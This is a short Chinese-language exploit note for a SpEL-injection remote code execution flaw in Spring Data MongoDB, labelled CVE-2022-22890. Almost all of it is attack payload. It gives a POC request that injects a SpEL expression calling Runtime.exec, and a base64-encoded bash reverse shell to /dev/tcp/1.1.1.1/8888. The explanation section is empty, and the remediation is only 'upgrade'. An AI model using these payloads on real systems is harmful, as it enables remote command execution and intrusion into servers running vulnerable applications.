# SpringDataMongoDBSpEL RCE(CVE-2022-22890)

## 利用条件：
- SpringDataMongoDB 应用程序在使用带有 SpEL 表达式的 @Query 或 @Aggregation-annotated 查询方法且输入未经过过滤。

## 利用方法：
#### POC：
```shell
POST /?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27ping%20a.dnslog.cn%27)
Host: 1.1.1.1
Connection: close
```
![](/img/poc.png)
- linux反弹shell POC：
`bash -i >&/dev/tcp/1.1.1.1/8888 0>&1`经过base64变形后进行url编码
```shell
bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}
```
![](/img/shell.png)

## 漏洞原理：

## 漏洞修复：
1. 使用官方最新发布版本。